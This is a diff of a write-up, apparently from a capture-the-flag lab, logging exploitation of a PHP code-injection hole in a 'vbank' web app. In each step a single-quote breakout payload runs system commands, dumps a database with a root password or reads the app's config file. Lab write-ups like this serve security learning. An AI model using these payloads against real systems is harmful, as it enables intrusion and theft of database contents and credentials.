@@ -15,22 +15,22 @@ This document records the systematic attempts to exploit the Remote Code Executi
 - **Why it failed**: The internal PHP evaluator context for the inner `preg_replace` actually wraps the pattern in single quotes: `'#\b" . $query . "\b#i'`. Using double quotes resulted in a syntax error because we weren't breaking out of the single-quoted literal.
 
 ## Step 2: Syntax Correction (Single Quote Breakout)
-**Payload**: `query=test'.system('id').'`
+**Payload**: `query=test'.(system('id')).'`
 - **Why we tried it**: Adjusted to match the internal single-quote string context.
 - **Result**: **Partial Success**. The command `id` executed, but our follow-up command `mysqldump` failed to produce a file.
 
 ## Step 3: Network Pivot (Host Identification)
-**Payload**: `query=test'.system('mysqldump -u root -paaa vbank > vbank_dump.sql').'`
+**Payload**: `query=test'.(system('mysqldump -u root -paaa vbank > vbank_dump.sql')).'`
 - **Why we tried it**: Attempted to use the standard database backup utility.
 - **Why it failed**: In a Docker Compose environment, `localhost` refers to the `vbank_app` container itself. The database was isolated in the `mysql` container. The command failed because it could not find a running MySQL instance on `127.0.0.1`.
 
 ## Step 4: Credential Discovery (Dynamic Host Targeting)
-**Payload**: `query=test'.include('../etc/config.php').(print $htbconf['db/.server']).'`
+**Payload**: `query=test'.(include('../etc/config.php')).(print $htbconf['db/.server']).'`
 - **Why we tried it**: We leveraged RCE to read the application's own configuration to find the correct database hostname (`mysql`).
 - **Result**: Confirmed the host was `mysql`.
 
 ## Step 5: Binary Dependency Check (The Missing Client)
-**Payload**: `query=test'.system('mysqldump -h mysql -u root -paaa vbank > vbank_dump.sql').'`
+**Payload**: `query=test'.(system('mysqldump -h mysql -u root -paaa vbank > vbank_dump.sql')).'`
 - **Why we tried it**: Targeted the correct container host using `-h mysql`.
 - **Why it failed**: **Binary Not Found**. Verification via `which mysqldump` confirmed that the `mysql-client` package was not installed in the `Dockerfile`. The system could not execute a utility that didn't exist.
 
